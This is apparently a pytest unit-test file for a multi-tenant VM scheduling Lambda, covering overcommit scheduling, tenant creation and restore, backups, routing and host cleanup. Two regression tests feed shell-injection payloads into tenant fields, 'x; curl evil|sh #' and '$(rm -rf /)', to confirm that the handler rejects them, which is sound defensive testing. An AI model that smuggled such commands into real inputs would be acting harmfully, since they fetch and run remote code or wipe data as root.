# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0

"""Unit tests for deploy/lambda/api/handler.py.
Covers: scheduling (_find_host), overcommit, tenant CRUD, host ops, routing.
"""

import importlib.util
import json
import sys
from unittest.mock import MagicMock, patch

import pytest
from conftest import make_ddb_table

# ── Import handler with mocked AWS SDK ──
_mock_ddb = MagicMock()
_mock_ssm = MagicMock()
_mock_s3 = MagicMock()
_mock_asg = MagicMock()
_mock_elbv2 = MagicMock()

with patch("boto3.resource", return_value=_mock_ddb), \
     patch("boto3.client") as _mc:
    _mc.side_effect = lambda svc, **kw: {
        "ssm": _mock_ssm, "s3": _mock_s3, "autoscaling": _mock_asg,
        "elbv2": _mock_elbv2,
    }.get(svc, MagicMock())
    _mock_ddb.Table.side_effect = lambda name: make_ddb_table()
    spec = importlib.util.spec_from_file_location("api_handler", "deploy/lambda/api/handler.py")
    api = importlib.util.module_from_spec(spec)
    sys.modules["api_handler"] = api
    spec.loader.exec_module(api)


HAS_MEM_OVERCOMMIT = hasattr(api, "MEM_OVERCOMMIT_RATIO")


# ═══════════════════════════════════════════
# Scheduling: _find_host with overcommit
# ═══════════════════════════════════════════

def _host(total_vcpu=8, total_mem_mb=16384, used_vcpu=0, used_mem_mb=0, status="active"):
    return {"instance_id": "i-test", "total_vcpu": total_vcpu, "total_mem_mb": total_mem_mb,
            "used_vcpu": used_vcpu, "used_mem_mb": used_mem_mb, "status": status, "next_vm_num": 1}


class TestFindHostCPUOvercommit:
    @pytest.mark.unit
    def test_empty_host_fits(self):
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [_host()]}
        assert api._find_host(2, 4096) is not None

    @pytest.mark.unit
    def test_cpu_overcommit_allows_beyond_physical(self):
        """CPU ratio 2.0: 8 physical → 16 allocatable. 10 used + 4 needed = 14 ≤ 16 → fits."""
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [_host(used_vcpu=10)]}
        assert api._find_host(4, 0) is not None

    @pytest.mark.unit
    def test_cpu_overcommit_rejects_when_full(self):
        """8 physical × 2.0 = 16 allocatable. 16 used + 2 needed = 18 > 16 → reject."""
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [_host(used_vcpu=16)]}
        assert api._find_host(2, 0) is None


class TestFindHostMemOvercommit:
    @pytest.mark.unit
    @pytest.mark.skipif(not HAS_MEM_OVERCOMMIT, reason="mem_overcommit_ratio not implemented yet")
    def test_mem_overcommit_allows_beyond_physical(self):
        """MEM ratio 1.5: 16GB physical → 24GB allocatable. 18GB used + 4GB needed ≤ 24GB → fits."""
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [_host(used_mem_mb=18000)]}
        assert api._find_host(0, 4096) is not None

    @pytest.mark.unit
    @pytest.mark.skipif(not HAS_MEM_OVERCOMMIT, reason="mem_overcommit_ratio not implemented yet")
    def test_mem_overcommit_rejects_when_full(self):
        """16GB × 1.5 = 24GB. 24GB used + 4GB needed > 24GB → reject."""
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [_host(used_mem_mb=24576)]}
        assert api._find_host(0, 4096) is None


class TestFindHostCombined:
    @pytest.mark.unit
    def test_both_must_fit(self):
        """CPU has room but memory full → reject."""
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [_host(used_vcpu=4, used_mem_mb=24576)]}
        assert api._find_host(2, 4096) is None

    @pytest.mark.unit
    def test_no_overcommit_strict(self):
        """Ratio 1.0 → strict physical limits."""
        orig_cpu = api.CPU_OVERCOMMIT_RATIO
        orig_mem = getattr(api, "MEM_OVERCOMMIT_RATIO", 1.0)
        try:
            api.CPU_OVERCOMMIT_RATIO = 1.0
            if HAS_MEM_OVERCOMMIT:
                api.MEM_OVERCOMMIT_RATIO = 1.0
            api.hosts_table = make_ddb_table()
            api.hosts_table.scan.return_value = {"Items": [_host(used_vcpu=7, used_mem_mb=13000)]}
            assert api._find_host(2, 4096) is None  # 8-7=1 < 2
        finally:
            api.CPU_OVERCOMMIT_RATIO = orig_cpu
            if HAS_MEM_OVERCOMMIT:
                api.MEM_OVERCOMMIT_RATIO = orig_mem

    @pytest.mark.unit
    def test_picks_first_fit(self):
        h1 = _host(total_vcpu=8, total_mem_mb=16384)  # empty, fits easily
        h1["instance_id"] = "i-first"
        h2 = _host(); h2["instance_id"] = "i-second"
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [h1, h2]}
        result = api._find_host(2, 4096)
        assert result["instance_id"] == "i-first"

    @pytest.mark.unit
    def test_no_hosts_returns_none(self):
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": []}
        assert api._find_host(2, 4096) is None


# ═══════════════════════════════════════════
# list_hosts
# ═══════════════════════════════════════════

class TestListHosts:
    @pytest.mark.unit
    def test_includes_overcommit_ratios(self):
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [{"instance_id": "i-1", "status": "active", "vm_count": 0}]}
        body = json.loads(api.list_hosts()["body"])
        assert body[0]["cpu_overcommit_ratio"] == 2.0
        if HAS_MEM_OVERCOMMIT:
            assert body[0]["mem_overcommit_ratio"] == 1.5

    @pytest.mark.unit
    def test_empty_hosts(self):
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": []}
        body = json.loads(api.list_hosts()["body"])
        assert body == []

    @pytest.mark.unit
    def test_filters_out_synthetic_state_records(self):
        """1.3.0 — the health_check Lambda stores AZ-failover cooldown state
        on a synthetic host record with instance_id='__az_failover_state__'.
        list_hosts must not leak that to the console / API consumers, who
        expect every returned record to be a real EC2 host with private_ip,
        total_vcpu, etc.
        """
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [
            {"instance_id": "i-real", "status": "active", "vm_count": 0,
             "private_ip": "10.0.0.1"},
            {"instance_id": "__az_failover_state__",
             "az_last_failover": {"az-a": "2026-01-01T00:00:00Z"}},
            {"instance_id": "__future_state__", "some_field": "x"},
        ]}
        body = json.loads(api.list_hosts()["body"])
        ids = [h["instance_id"] for h in body]
        assert ids == ["i-real"]
        assert all(not i.startswith("__") for i in ids)


# ═══════════════════════════════════════════
# Tenant CRUD
# ═══════════════════════════════════════════

class TestCreateTenant:
    @pytest.mark.unit
    def test_pending_when_no_host(self):
        api.tenants_table = make_ddb_table()
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": []}
        _mock_asg.describe_auto_scaling_groups.return_value = {
            "AutoScalingGroups": [{"DesiredCapacity": 1, "MaxSize": 5}]}
        resp = api.create_tenant(json.dumps({"name": "test"}))
        assert resp["statusCode"] == 201
        assert json.loads(resp["body"])["status"] == "pending"

    @pytest.mark.unit
    def test_missing_body_returns_400(self):
        resp = api.create_tenant(None)
        assert resp["statusCode"] == 400

    # ── SECURITY: config_template / skills flow into the root SSM launch
    # command (launch-vm.sh args 5 & 7). Shell metacharacters must be rejected
    # at create time, or they are arbitrary root RCE on a shared host.
    @pytest.mark.unit
    @pytest.mark.regression
    def test_config_template_injection_rejected(self):
        api.tenants_table = make_ddb_table()
        api.hosts_table = make_ddb_table()
        resp = api.create_tenant(json.dumps({
            "name": "evil", "config_template": "x; curl evil|sh #"}))
        assert resp["statusCode"] == 400
        assert "config_template" in json.loads(resp["body"])["error"]

    @pytest.mark.unit
    def test_config_template_valid_name_accepted(self):
        # A well-formed template name must NOT be rejected by the guard
        # (it fails later on no-host → pending, which is fine — not a 400).
        api.tenants_table = make_ddb_table()
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": []}
        _mock_asg.describe_auto_scaling_groups.return_value = {
            "AutoScalingGroups": [{"DesiredCapacity": 1, "MaxSize": 5}]}
        resp = api.create_tenant(json.dumps({
            "name": "ok", "config_template": "bedrock-claude"}))
        assert resp["statusCode"] == 201

    @pytest.mark.unit
    @pytest.mark.regression
    def test_skill_name_injection_rejected(self):
        api.tenants_table = make_ddb_table()
        api.hosts_table = make_ddb_table()
        resp = api.create_tenant(json.dumps({
            "name": "evil2", "skills": ["ok-skill", "$(rm -rf /)"]}))
        assert resp["statusCode"] == 400
        assert "skill" in json.loads(resp["body"])["error"].lower()


class TestCreateTenantRestore:
    """restore_from branch in create_tenant."""

    def _prep_host(self):
        """Common setup: one host with capacity."""
        api.tenants_table = make_ddb_table()
        api.hosts_table = make_ddb_table()
        api.hosts_table.scan.return_value = {"Items": [
            {"instance_id": "i-test", "total_vcpu": 8, "total_mem_mb": 16384,
             "used_vcpu": 0, "used_mem_mb": 0, "status": "active",
             "next_vm_num": 1, "private_ip": "10.0.0.1", "rootfs_version": "v1.0"},
        ]}

    @pytest.mark.unit
    def test_restore_latest_backup(self):
        """No timestamp → pick most recent backup from S3."""
        self._prep_host()
        import datetime
        _mock_s3.list_objects_v2.return_value = {"Contents": [
            {"Key": "backups/src/20260101-000000.gz", "LastModified": datetime.datetime(2026, 1, 1), "Size": 100},
            {"Key": "backups/src/20260301-000000.gz", "LastModified": datetime.datetime(2026, 3, 1), "Size": 200},
        ]}
        resp = api.create_tenant(json.dumps({
            "name": "restored", "restore_from": {"tenant_id": "src"}
        }))
        assert resp["statusCode"] == 201
        # put_item should have been called with restore_backup_key = the latest
        put_calls = api.tenants_table.put_item.call_args_list
        assert len(put_calls) >= 1
        saved = put_calls[-1].kwargs["Item"]
        assert saved["restore_backup_key"] == "backups/src/20260301-000000.gz"

    @pytest.mark.unit
    def test_restore_specific_timestamp(self):
        """With timestamp → must match exact key."""
        self._prep_host()
        import datetime
        _mock_s3.list_objects_v2.return_value = {"Contents": [
            {"Key": "backups/src/20260101-000000.gz", "LastModified": datetime.datetime(2026, 1, 1), "Size": 100},
            {"Key": "backups/src/20260301-000000.gz", "LastModified": datetime.datetime(2026, 3, 1), "Size": 200},
        ]}
        resp = api.create_tenant(json.dumps({
            "name": "restored",
            "restore_from": {"tenant_id": "src", "timestamp": "20260101-000000"}
        }))
        assert resp["statusCode"] == 201
        saved = api.tenants_table.put_item.call_args_list[-1].kwargs["Item"]
        assert saved["restore_backup_key"] == "backups/src/20260101-000000.gz"

    @pytest.mark.unit
    def test_restore_source_has_no_backups_returns_404(self):
        self._prep_host()
        _mock_s3.list_objects_v2.return_value = {"Contents": []}
        resp = api.create_tenant(json.dumps({
            "name": "restored", "restore_from": {"tenant_id": "src-gone"}
        }))
        assert resp["statusCode"] == 404
        assert "no backups found" in json.loads(resp["body"])["error"]

    @pytest.mark.unit
    def test_restore_timestamp_not_found_returns_404(self):
        self._prep_host()
        import datetime
        _mock_s3.list_objects_v2.return_value = {"Contents": [
            {"Key": "backups/src/20260101-000000.gz", "LastModified": datetime.datetime(2026, 1, 1), "Size": 100},
        ]}
        resp = api.create_tenant(json.dumps({
            "name": "restored",
            "restore_from": {"tenant_id": "src", "timestamp": "20990101-000000"}
        }))
        assert resp["statusCode"] == 404
        assert "backup not found" in json.loads(resp["body"])["error"]

    @pytest.mark.unit
    def test_restore_from_missing_tenant_id_returns_400(self):
        self._prep_host()
        resp = api.create_tenant(json.dumps({
            "name": "restored", "restore_from": {"timestamp": "20260101-000000"}
        }))
        assert resp["statusCode"] == 400

    @pytest.mark.unit
    def test_restore_when_source_tenant_deleted(self):
        """Source tenant doesn't need to exist in DDB — only S3 backup matters."""
        self._prep_host()
        # tenants_table.get_item not consulted; only s3 list
        import datetime
        _mock_s3.list_objects_v2.return_value = {"Contents": [
            {"Key": "backups/src-deleted/20260101-000000.gz", "LastModified": datetime.datetime(2026, 1, 1), "Size": 100},
        ]}
        resp = api.create_tenant(json.dumps({
            "name": "restored", "restore_from": {"tenant_id": "src-deleted"}
        }))
        assert resp["statusCode"] == 201

    @pytest.mark.unit
    def test_normal_create_unaffected(self):
        """Without restore_from, restore_backup_key persisted as empty."""
        self._prep_host()
        resp = api.create_tenant(json.dumps({"name": "normal"}))
        assert resp["statusCode"] == 201
        saved = api.tenants_table.put_item.call_args_list[-1].kwargs["Item"]
        assert saved.get("restore_backup_key", "") == ""


class TestListAllBackups:
    """GET /backups — cross-tenant aggregate."""

    @pytest.mark.unit
    def test_marks_orphan_vs_active(self):
        api.tenants_table = make_ddb_table()
        api.tenants_table.scan.return_value = {"Items": [
            {"id": "alive", "name": "my-agent", "status": "running"},
            {"id": "soft-deleted", "name": "old", "status": "deleted"},
            # "orphan-in-s3" has no DDB row at all
        ]}
        import datetime
        # Mock paginator → returns one page
        page = {"Contents": [
            {"Key": "backups/alive/20260301-000000.gz",
             "LastModified": datetime.datetime(2026, 3, 1), "Size": 1000},
            {"Key": "backups/soft-deleted/20260201-000000.gz",
             "LastModified": datetime.datetime(2026, 2, 1), "Size": 2000},
            {"Key": "backups/orphan-in-s3/20260101-000000.gz",
             "LastModified": datetime.datetime(2026, 1, 1), "Size": 3000},
        ]}
        paginator = MagicMock()
        paginator.paginate.return_value = [page]
        _mock_s3.get_paginator.return_value = paginator

        resp = api.list_all_backups()
        assert resp["statusCode"] == 200
        backups = json.loads(resp["body"])
        # Sorted by last_modified desc
        assert [b["tenant_id"] for b in backups] == ["alive", "soft-deleted", "orphan-in-s3"]
        # alive → tenant_exists true, orphan/deleted → false
        by_id = {b["tenant_id"]: b for b in backups}
        assert by_id["alive"]["tenant_exists"] is True
        assert by_id["alive"]["tenant_name"] == "my-agent"
        assert by_id["soft-deleted"]["tenant_exists"] is False
        assert by_id["orphan-in-s3"]["tenant_exists"] is False
        assert by_id["orphan-in-s3"]["tenant_name"] is None

    @pytest.mark.unit
    def test_skips_non_gz_and_malformed_keys(self):
        api.tenants_table = make_ddb_table()
        api.tenants_table.scan.return_value = {"Items": []}
        import datetime
        page = {"Contents": [
            {"Key": "backups/", "LastModified": datetime.datetime(2026, 1, 1), "Size": 0},        # malformed
            {"Key": "backups/tenant/readme.txt", "LastModified": datetime.datetime(2026, 1, 1), "Size": 10},  # not .gz
            {"Key": "backups/tenant/20260101-000000.gz", "LastModified": datetime.datetime(2026, 1, 1), "Size": 100},
        ]}
        paginator = MagicMock()
        paginator.paginate.return_value = [page]
        _mock_s3.get_paginator.return_value = paginator

        resp = api.list_all_backups()
        backups = json.loads(resp["body"])
        assert len(backups) == 1
        assert backups[0]["timestamp"] == "20260101-000000"


class TestGetTenant:
    @pytest.mark.unit
    def test_not_found(self):
        api.tenants_table = make_ddb_table()
        api.tenants_table.get_item.return_value = {}
        resp = api.get_tenant("nonexistent")
        assert resp["statusCode"] == 404

    @pytest.mark.unit
    def test_found(self):
        api.tenants_table = make_ddb_table()
        api.tenants_table.get_item.return_value = {"Item": {"id": "t1", "status": "running"}}
        resp = api.get_tenant("t1")
        assert resp["statusCode"] == 200


class TestListTenants:
    @pytest.mark.unit
    def test_returns_200(self):
        api.tenants_table = make_ddb_table()
        api.tenants_table.scan.return_value = {"Items": [{"id": "t1"}]}
        resp = api.list_tenants()
        assert resp["statusCode"] == 200
        assert len(json.loads(resp["body"])) == 1


# ═══════════════════════════════════════════
# Routing + CORS (regression)
# ═══════════════════════════════════════════

class TestRouting:
    @pytest.mark.unit
    @pytest.mark.regression
    def test_unknown_route_404(self):
        resp = api.lambda_handler({"httpMethod": "GET", "resource": "/nope", "pathParameters": {}}, None)
        assert resp["statusCode"] == 404

    @pytest.mark.unit
    @pytest.mark.regression
    def test_cors_headers(self):
        api.tenants_table = make_ddb_table()
        api.tenants_table.scan.return_value = {"Items": []}
        resp = api.lambda_handler({"httpMethod": "GET", "resource": "/tenants", "pathParameters": {}}, None)
        assert resp["headers"]["Access-Control-Allow-Origin"] == "*"
        assert "x-api-key" in resp["headers"]["Access-Control-Allow-Headers"]

    @pytest.mark.unit
    @pytest.mark.regression
    def test_eventbridge_source_handled(self):
        """EventBridge events should not crash."""
        api.tenants_table = make_ddb_table()
        api.tenants_table.scan.return_value = {"Items": []}
        resp = api.lambda_handler({
            "source": "aws.autoscaling",
            "detail-type": "EC2 Instance Launch Successful",
            "detail": {},
        }, None)
        assert resp["statusCode"] == 200


class TestHostCleanupHardDelete:
    """cleanup_terminated_host must HARD-delete the host row, not soft-mark it
    status=deleted — soft rows accumulated (161 zombies observed live) and
    inflated every scan / faked AZ outages."""

    @pytest.mark.unit
    @pytest.mark.regression
    def test_host_row_is_deleted_not_soft_marked(self):
        api.tenants_table = make_ddb_table()
        api.tenants_table.scan.return_value = {"Items": []}  # no tenants on host
        api.hosts_table = make_ddb_table()
        with patch.object(api, "_remove_host_tg"), \
             patch.object(api, "asg_client"):
            api.cleanup_terminated_host({"detail": {
                "EC2InstanceId": "i-dead",
                "LifecycleHookName": "hook", "AutoScalingGroupName": "asg"}})
        api.hosts_table.delete_item.assert_called_once_with(Key={"instance_id": "i-dead"})
        # And it must NOT leave a soft status=deleted update on the host row.
        for c in api.hosts_table.update_item.call_args_list:
            vals = c.kwargs.get("ExpressionAttributeValues", {})
            assert vals.get(":s") != "deleted", "host was soft-marked instead of deleted"


# ═══════════════════════════════════════════
# Helper: _gen_id
# ═══════════════════════════════════════════

class TestGenId:
    @pytest.mark.unit
    def test_format(self):
        tid = api._gen_id("myvm")
        assert tid.startswith("myvm-")
        assert len(tid) == len("myvm-") + 4

    @pytest.mark.unit
    def test_unique(self):
        import time
        ids = set()
        for _ in range(20):
            ids.add(api._gen_id("vm"))
            time.sleep(0.001)  # Ensure different time.time()
        assert len(ids) == 20


# ═══════════════════════════════════════════
# AgentCore status
# ═══════════════════════════════════════════

class TestAgentCoreStatus:
    @pytest.mark.unit
    def test_disabled_by_default(self):
        """When AGENTCORE_ENABLED not set, status returns disabled."""
        import os
        orig = os.environ.pop("AGENTCORE_ENABLED", None)
        try:
            # Re-read env in handler
            api.os.environ.pop("AGENTCORE_ENABLED", None)
            resp = api.agentcore_status()
            body = json.loads(resp["body"])
            assert body["enabled"] is False
            assert body["gateway_url"] is None
        finally:
            if orig:
                os.environ["AGENTCORE_ENABLED"] = orig

    @pytest.mark.unit
    def test_enabled_with_gateway(self):
        """When enabled with gateway URL, both are returned."""
        import os
        orig_enabled = os.environ.get("AGENTCORE_ENABLED")
        orig_url = os.environ.get("AGENTCORE_GATEWAY_URL")
        try:
            os.environ["AGENTCORE_ENABLED"] = "true"
            os.environ["AGENTCORE_GATEWAY_URL"] = "https://gateway.example.com"
            resp = api.agentcore_status()
            body = json.loads(resp["body"])
            assert body["enabled"] is True
            assert body["gateway_url"] == "https://gateway.example.com"
        finally:
            if orig_enabled is None:
                os.environ.pop("AGENTCORE_ENABLED", None)
            else:
                os.environ["AGENTCORE_ENABLED"] = orig_enabled
            if orig_url is None:
                os.environ.pop("AGENTCORE_GATEWAY_URL", None)
            else:
                os.environ["AGENTCORE_GATEWAY_URL"] = orig_url

    @pytest.mark.unit
    @pytest.mark.regression
    def test_status_route_accessible(self):
        """GET /agentcore/status should be routable."""
        resp = api.lambda_handler({
            "httpMethod": "GET", "resource": "/agentcore/status",
            "pathParameters": {},
        }, None)
        assert resp["statusCode"] == 200
        body = json.loads(resp["body"])
        assert "enabled" in body
